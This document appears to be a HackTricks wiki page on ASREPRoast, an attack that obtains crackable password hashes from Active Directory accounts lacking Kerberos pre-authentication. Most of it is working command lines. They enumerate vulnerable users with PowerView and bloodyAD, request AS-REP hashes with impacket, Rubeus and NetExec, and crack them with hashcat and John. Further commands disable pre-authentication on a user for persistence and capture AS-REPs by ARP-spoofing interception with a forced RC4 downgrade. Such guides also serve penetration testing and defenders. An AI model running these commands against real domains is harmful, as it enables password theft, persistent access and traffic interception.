# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast is a security attack that exploits users who lack the **Kerberos pre-authentication required attribute**. Essentially, this vulnerability allows attackers to request authentication for a user from the Domain Controller (DC) without needing the user's password. The DC then responds with a message encrypted with the user's password-derived key, which attackers can attempt to crack offline to discover the user's password.

The main requirements for this attack are:

- **Lack of Kerberos pre-authentication**: Target users must not have this security feature enabled.
- **Connection to the Domain Controller (DC)**: Attackers need access to the DC to send requests and receive encrypted messages.
- **Optional domain account**: Having a domain account allows attackers to more efficiently identify vulnerable users through LDAP queries. Without such an account, attackers must guess usernames.

#### Enumerating vulnerable users (need domain credentials)

```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

#### Request AS_REP message

```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

> [!WARNING]
> Rubeus requests **RC4** by default, so Event ID **4768** usually shows **preauth type 0** and **ticket encryption type 0x17**. If you add **`/aes`** (or RC4 is disabled for the target), expect **AES etypes** instead.

#### Quick one-liners (Linux)

- Enumerate potential targets first (e.g., from leaked build paths) with Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Roast a whole username list without valid creds using NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`
- If you do have creds, let NetExec query LDAP and request every roastable account for you: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`
- If the output starts with **`$krb5asrep$23$`**, crack it with Hashcat **`-m 18200`**. If it starts with **`$krb5asrep$17$`** or **`$krb5asrep$18$`**, prefer John **`--format=krb5asrep`**.

### Cracking

Don't assume every AS-REP roast is RC4. Modern tooling can return **RC4** (`$krb5asrep$23$`) or **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) depending on the requested/negotiated enctype. **`hashcat -m 18200`** is for **etype 23**, while **John** handles `krb5asrep` directly for **17/18/23**.

```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```

### Persistence

Force **preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):

```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```

## ASREProast without credentials

An attacker can use a man-in-the-middle position to capture AS-REP packets as they traverse the network without relying on Kerberos pre-authentication being disabled. It therefore works for all users on the VLAN.\
If you want the related no-credential trick that returns a **service ticket** instead of a **TGT** from a no-preauth principal, see [Kerberoast](kerberoast.md).

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) allows us to do so. `relay` mode is the interesting one offensively because it can force **RC4** when the client still advertises **etype 23**; `listen` stays passive and just captures whatever the client/DC negotiated.

```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```

## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}



